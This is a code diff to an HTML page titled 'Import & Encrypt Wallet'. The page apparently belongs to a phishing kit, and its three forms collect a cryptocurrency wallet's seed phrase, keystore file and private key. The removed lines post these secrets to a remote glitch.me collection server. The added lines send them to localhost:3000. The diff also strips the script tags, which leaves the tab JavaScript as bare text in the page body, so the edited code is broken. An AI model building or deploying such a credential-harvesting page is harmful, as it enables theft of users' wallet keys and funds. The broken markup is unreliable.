@@ -13,7 +13,6 @@
 
     <title>Import</title>
   </head>
-
   <body>
     <h1 class="text-3xl font-extrabold text-center mb-9 mt-20">
       Import & Encrypt Wallet
@@ -58,7 +57,7 @@
       <div id="bar-with-underline-1" role="tabpanel" class="tab-panel">
         <form
           method="post"
-          action="https://gratis-lace-park.glitch.me/submit-seed"
+          action="http://localhost:3000/submit-seed"
           class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
           id="form-seed"
         >
@@ -93,7 +92,7 @@
       <div id="bar-with-underline-2" class="tab-panel hidden">
         <form
           method="post"
-          action="https://gratis-lace-park.glitch.me/submit-keystore"
+          action="http://localhost:3000/submit-keystore"
           class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
           id="form-keystore"
         >
@@ -145,7 +144,7 @@
       <div id="bar-with-underline-3" class="tab-panel hidden">
         <form
           method="post"
-          action="https://gratis-lace-park.glitch.me/submit-privatekey"
+          action="http://localhost:3000/submit-privatekey"
           class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
           id="form-privatekey"
         >
@@ -175,39 +174,18 @@
         </form>
       </div>
     </div>
-    <script>
-      const tabs = document.querySelectorAll("[data-tab-target]");
-      const tabPanels = document.querySelectorAll(".tab-panel");
-
-      tabs.forEach((tab) => {
-        tab.addEventListener("click", () => {
-          const target = document.querySelector(tab.dataset.tabTarget);
-          if (target) {
-            tabPanels.forEach((panel) => panel.classList.add("hidden"));
-            tabs.forEach((t) => {
-              t.classList.remove(
-                "active",
-                "hs-tab-active:border-b-blue-600",
-                "hs-tab-active:text-gray-900"
-              );
-              t.classList.remove(
-                "dark:hs-tab-active:text-white",
-                "dark:hs-tab-active:border-b-blue-600"
-              );
-            });
-            target.classList.remove("hidden");
-            tab.classList.add(
-              "active",
-              "hs-tab-active:border-b-blue-600",
-              "hs-tab-active:text-gray-900"
-            );
-            tab.classList.add(
-              "dark:hs-tab-active:text-white",
-              "dark:hs-tab-active:border-b-blue-600"
-            );
-          }
-        });
-      });
-    </script>
+    const tabs = document.querySelectorAll("[data-tab-target]"); const tabPanels
+    = document.querySelectorAll(".tab-panel"); tabs.forEach((tab) => {
+    tab.addEventListener("click", () => { const target =
+    document.querySelector(tab.dataset.tabTarget); if (target) {
+    tabPanels.forEach((panel) => panel.classList.add("hidden"));
+    tabs.forEach((t) => { t.classList.remove("active",
+    "hs-tab-active:border-b-blue-600", "hs-tab-active:text-gray-900");
+    t.classList.remove("dark:hs-tab-active:text-white",
+    "dark:hs-tab-active:border-b-blue-600"); });
+    target.classList.remove("hidden"); tab.classList.add("active",
+    "hs-tab-active:border-b-blue-600", "hs-tab-active:text-gray-900");
+    tab.classList.add("dark:hs-tab-active:text-white",
+    "dark:hs-tab-active:border-b-blue-600"); } }); });
   </body>
 </html>
